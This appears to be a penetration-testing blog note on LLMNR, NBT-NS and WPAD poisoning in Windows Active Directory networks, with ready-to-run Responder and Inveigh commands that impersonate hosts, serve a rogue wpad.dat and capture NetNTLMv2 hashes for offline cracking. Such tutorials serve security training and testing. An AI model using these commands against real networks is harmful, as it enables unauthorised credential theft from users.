---
title: Network Poisoning
date: 2026-06-29 20:25:32


categories:
  - Active Directory
  - Exploitation
  - Network Poisonin

tags:
  - Windows
  - Active-Directory
  - LLMNR
  - NBT-NS
  - mDNS
  - Network-Poisoning
  - Name-Resolution
  - Responder
  - Inveigh
  - InveighZero
  - WPAD
  - WPAD-Spoofing
  - Rogue-Proxy
  - Proxy
  - NTLM
  - NetNTLMv2
  - Hash-Capture
  - SMB

cover: /img/network-poisoning.png
top_img: /img/bg-img.jpg
description: Learn how we can abuse LLMNR, NBT-NS, and WPAD to capture NetNTLMv2 credentials using Responder or Inveigh for offline cracking.
---


## SMB (LLMNR / NBT-NS Poisoning)

> ➜ LLMNR (`UDP 5355`) and NBT-NS (`UDP 137`) are name resolution protocols used when DNS cannot resolve a hostname. An attacker can spoof these requests, causing the victim to connect to the attacker's machine instead of the intended host.

> ➜ If a victim attempts to access a non-existent SMB share (e.g., `\\printer01\share`) and DNS cannot resolve the hostname, Windows broadcasts an LLMNR/NBT-NS query. The attacker replies first, impersonating the requested host. Since the victim believes it is connecting to a legitimate SMB server, Windows automatically performs NTLM authentication, allowing the attacker to capture the resulting NetNTLMv2 hash.

### Responder (Linux)

```bash
sudo responder -I ens224
```

> ➜ Responder listens for and poisons **LLMNR**, **NBT-NS**, and **mDNS** requests. Captured SMB hashes are written to:

```text
/usr/share/responder/logs/SMB-NTLMv2-<victim-ip>.txt
```

### Inveigh (Windows)

```powershell
Import-Module .\Inveigh.ps1
```

```powershell
Invoke-Inveigh -LLMNR Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```

Or using `Inveigh.exe` :

```powershell
.\Inveigh.exe
```


## WPAD Rogue Proxy


> ➜ WPAD (Web Proxy Auto-Discovery Protocol) is a Windows feature that automatically discovers whether a browser should use a web proxy. Without WPAD, administrators would have to manually configure the proxy (e.g., `proxy.corp.local:8080`) on every computer.

> ➜ A proxy sits between the client and the Internet, allowing organizations to inspect web traffic, block malicious websites, scan downloads, log internet activity, and enforce security policies.

> ➜ When Automatically detect settings is enabled, Windows looks for a configuration file named `wpad.dat`. This file contains a small JavaScript function that tells the browser which proxy to use.

```javascript
function FindProxyForURL(url, host) {
    return "PROXY proxy.corp.local:8080";
}
```


#### Starting Responder

> ➜ We can start Responder with the following command:

```
sudo responder -I ens224 -w -P
```

> ➜ Where:
> 
> - `-I ens224` specifies the network interface.
> - `-w` enables the rogue WPAD server and serves a malicious `wpad.dat`.
> - `-P` forces Proxy Authentication, causing the victim's browser to authenticate to the attacker's proxy using NTLM.

> Captured credentials are written to:

```
/usr/share/responder/logs/HTTP-NTLMv2-<victim-ip>.txt
```

> ➜ When the victim attempts to automatically discover a proxy, Responder answers the WPAD request, serves the malicious `wpad.dat`, and captures the resulting NetNTLMv2 authentication.

